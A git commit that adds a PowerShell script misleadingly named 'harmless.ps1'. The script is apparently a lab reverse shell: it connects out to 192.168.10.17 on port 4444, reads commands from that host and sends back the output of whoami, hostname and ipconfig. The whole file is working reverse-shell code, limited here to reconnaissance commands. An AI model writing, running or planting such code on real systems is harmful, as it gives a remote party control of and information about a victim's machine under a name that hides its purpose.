672af712d5ff3f98b4e5828bb2dadc77f584e4b9
aaron-minhas <133404313+aaron-minhas@users.noreply.github.com>
2026-09-21 11:33:29 +0500

    Create harmless.ps1

---
+++ harmless.ps1
@@ -0,0 +1,40 @@
+$client = New-Object System.Net.Sockets.TcpClient("192.168.10.17",4444)
+$stream = $client.GetStream()
+
+$reader = New-Object System.IO.StreamReader($stream)
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+
+while ($true) {
+    $writer.Write("LAB> ")
+
+    $command = $reader.ReadLine()
+
+    if ($command -eq "exit") {
+        break
+    }
+
+    switch ($command) {
+        "whoami" {
+            $output = whoami
+        }
+
+        "hostname" {
+            $output = hostname
+        }
+
+        "ipconfig" {
+            $output = ipconfig | Out-String
+        }
+
+        default {
+            $output = "Command not allowed."
+        }
+    }
+
+    $writer.WriteLine($output)
+}
+
+$reader.Close()
+$writer.Close()
+$client.Close()
